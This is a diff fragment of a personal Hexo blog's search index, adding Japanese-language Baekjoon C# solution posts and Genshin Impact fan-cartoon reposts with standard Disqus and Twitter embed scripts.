-    */
-    (function() { // DON'T EDIT BELOW THIS LINE
-    var d = document, s = d.createElement('script');
-    s.src = 'https://kurailuna.disqus.com/embed.js';
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-    })();
-</script>]]></content>
-      <categories>
-        <category>DevDiary</category>
-        <category>Baekjoon(JP)</category>
-      </categories>
-      <tags>
-        <tag>Baekjoon</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>『ベクジュン·アルゴリズム』ちび·ジョンミン</title>
     <url>/2023/07/05/Baekjoon/Baekjoon_Little_Jeongmin_11382/</url>
     <content><![CDATA[<meta charset="UTF-8">
@@ -2372,6 +2276,150 @@ Alright then,
 <h3 id="結果『けっか』"><a href="#結果『けっか』" class="headerlink" title="結果『けっか』"></a>結果『けっか』</h3><br>
 <div class="left-img">
 <img src="https://luna0x03.github.io/PostImages/DevDiary/Baekjoon(JP)/11382/002.png" alt="미리보기 방지" width="580">
+</div> <br> <br> <br> <br> <br> <br> <br> <br> <br> 
+
+
+<div style="text-align: center;">
+<p style="font-size: 30px; color: #2844e2ff;"> 終わり</p>
+</div>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+    /*
+    var disqus_config = function () {
+    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://kurailuna.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>]]></content>
+      <categories>
+        <category>DevDiary</category>
+        <category>Baekjoon(JP)</category>
+      </categories>
+      <tags>
+        <tag>Baekjoon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【Cartoons】Klee Birthday 2025</title>
+    <url>/2025/08/27/ETC/Genshin-Cartoons/Genshin-Cartoons-Klee-Birthday-2025/</url>
+    <content><![CDATA[<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<h2 id="Cartoon"><a href="#Cartoon" class="headerlink" title="Cartoon"></a>Cartoon</h2><br>
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/(ETC)%20Taking%20a%20Break/%E3%80%90Genshin%E3%80%91Cartoons/2.Klee%20Birthday%202025/1.jpg" alt="" >
+</div><br><br>
+
+
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/(ETC)%20Taking%20a%20Break/%E3%80%90Genshin%E3%80%91Cartoons/2.Klee%20Birthday%202025/2.jpg" alt="" >
+</div><br><br>
+
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/(ETC)%20Taking%20a%20Break/%E3%80%90Genshin%E3%80%91Cartoons/2.Klee%20Birthday%202025/3.jpg" alt="" >
+</div>
+<!-- 접은 글 시작 -->
+<details>
+<summary>👉 Click to expand </summary>
+#Alice #Klee #Dodoco #Kaeya #Jean<br>
+#GenshinImpact #KleeBirthday2025 <br>
+#クレー #アリス #ドトコ #ジン <Br> 
+#ガイア・アルベリヒ #原神 <Br>
+#クレー生誕祭2025 
+</details>
+<!-- 접은 글 끝 -->
+
+<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I’m late；▽； but happy birthday, Klee!!!🎉💣🎉🍀<br> Alice gives Klee a wonderful present every year！🎁✨<a href="https://twitter.com/hashtag/%E3%82%AF%E3%83%AC%E3%83%BC%E7%94%9F%E8%AA%95%E7%A5%AD2025?src=hash&amp;ref_src=twsrc%5Etfw">#クレー生誕祭2025</a> <a href="https://twitter.com/hashtag/Klee?src=hash&amp;ref_src=twsrc%5Etfw">#Klee</a> <a href="https://t.co/UUSfAmo2Ub">pic.twitter.com/UUSfAmo2Ub</a></p>&mdash; えんぴつ　原神 (@a_kaeyada) <a href="https://twitter.com/a_kaeyada/status/1949579775393354177?ref_src=twsrc%5Etfw">July 27, 2025</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>]]></content>
+      <categories>
+        <category>(ETC) Taking a Break</category>
+        <category>【Genshin】Cartoons</category>
+      </categories>
+      <tags>
+        <tag>ETC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【漫画】スクロースの研究日誌</title>
+    <url>/2025/08/24/ETC/Genshin-Cartoons/%E6%BC%AB%E7%94%BB-%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E3%81%AE%E7%A0%94%E7%A9%B6%E6%97%A5%E8%AA%8C/</url>
+    <content><![CDATA[<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<h2 id="Cartoon"><a href="#Cartoon" class="headerlink" title="Cartoon"></a>Cartoon</h2><br>
+
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/(ETC)%20Taking%20a%20Break/%E3%80%90Genshin%E3%80%91Cartoons/1.%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E3%81%AE%E7%A0%94%E7%A9%B6%E6%97%A5%E8%AA%8C/1.jpg" alt="" >
+</div><br><br>
+
+
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/(ETC)%20Taking%20a%20Break/%E3%80%90Genshin%E3%80%91Cartoons/1.%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E3%81%AE%E7%A0%94%E7%A9%B6%E6%97%A5%E8%AA%8C/2.jpg" alt="" >
+</div>
+<!-- 접은 글 시작 -->
+<details>
+<summary>👉 Click to expand </summary>
+#Sucrose #GenshinImpact #Klee <br>
+#スクロース #原神 #クレー
+</details>
+<!-- 접은 글 끝 -->
+
+<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><blockquote class="twitter-tweet"><p lang="ja" dir="ltr">推しの誕生日…言葉は要らない…<a href="https://twitter.com/hashtag/%E5%8E%9F%E7%A5%9E?src=hash&amp;ref_src=twsrc%5Etfw">#原神</a> <a href="https://twitter.com/hashtag/GenshinImpact?src=hash&amp;ref_src=twsrc%5Etfw">#GenshinImpact</a> <a href="https://twitter.com/hashtag/%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9?src=hash&amp;ref_src=twsrc%5Etfw">#スクロース</a> <a href="https://twitter.com/hashtag/Sucrose?src=hash&amp;ref_src=twsrc%5Etfw">#Sucrose</a> <a href="https://twitter.com/hashtag/%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E7%94%9F%E8%AA%95%E7%A5%AD2021?src=hash&amp;ref_src=twsrc%5Etfw">#スクロース生誕祭2021</a> <a href="https://twitter.com/hashtag/%E5%8E%9F%E7%A5%9E_%E3%82%AD%E3%83%A3%E3%83%A9%E7%94%9F%E8%AA%95%E7%A5%AD?src=hash&amp;ref_src=twsrc%5Etfw">#原神_キャラ生誕祭</a> <a href="https://t.co/8lJS6ERZCV">pic.twitter.com/8lJS6ERZCV</a></p>&mdash; アリクイのイカク (@arikuigames1105) <a href="https://twitter.com/arikuigames1105/status/1463885185875808261?ref_src=twsrc%5Etfw">November 25, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+]]></content>
+      <categories>
+        <category>(ETC) Taking a Break</category>
+        <category>【Genshin】Cartoons</category>
+      </categories>
+      <tags>
+        <tag>ETC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>『ベクジュン·アルゴリズム』掛け算</title>
+    <url>/2023/07/05/Baekjoon/Baekjoon_multiply_2588/</url>
+    <content><![CDATA[<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/DevDiary/Baekjoon(JP)/2588/Baekjoon.png" alt="미리보기 방지" width="450">
+</div>
+
+<style>
+.left-img {
+  float: left;
+  margin-right: 320; /* 텍스트와 간격 */
+}
+</style>
+
+
+<h2 id="ベクジュン·オンライン·ジャージー-掛け算"><a href="#ベクジュン·オンライン·ジャージー-掛け算" class="headerlink" title="ベクジュン·オンライン·ジャージー &#x2F; 掛け算"></a>ベクジュン·オンライン·ジャージー &#x2F; 掛け算</h2><br>
+
+<h2 id="2588"><a href="#2588" class="headerlink" title="2588"></a>2588</h2><p>📎Link : <br><br><a href="https://www.acmicpc.net/problem/2588">https://www.acmicpc.net/problem/2588</a></p>
+<br>
+
+<h3 id="指紋表示"><a href="#指紋表示" class="headerlink" title="指紋表示"></a>指紋表示</h3><br>
+<div class="left-img">
+<img src="https://luna0x03.github.io/PostImages/DevDiary/Baekjoon(JP)/2588/01.jpg" alt="미리보기 방지" width="250%">
+</div> <br> <br><br><br><br><br><br><br><br><br><br>
+
+<br>
+
+<h3 id="解答『かいとう』"><a href="#解答『かいとう』" class="headerlink" title="解答『かいとう』"></a>解答『かいとう』</h3><h3 id="コード"><a href="#コード" class="headerlink" title="コード"></a>コード</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">static</span> System.Console;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">boj</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> a = ReadLine();</span><br><span class="line">            <span class="built_in">string</span> b = ReadLine();</span><br><span class="line"></span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * (<span class="built_in">int</span>)Char.GetNumericValue(b[<span class="number">2</span>]));</span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * (<span class="built_in">int</span>)Char.GetNumericValue(b[<span class="number">1</span>]));</span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * (<span class="built_in">int</span>)Char.GetNumericValue(b[<span class="number">0</span>]));</span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * <span class="built_in">int</span>.Parse(b));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="結果『けっか』"><a href="#結果『けっか』" class="headerlink" title="結果『けっか』"></a>結果『けっか』</h3><br>
+<div class="left-img">
+<img src="https://luna0x03.github.io/PostImages/DevDiary/Baekjoon(JP)/2588/002.png" alt="미리보기 방지" width="580">
 </div> <br> <br> <br> <br> <br> <br> <br> <br> <br> 
 
 
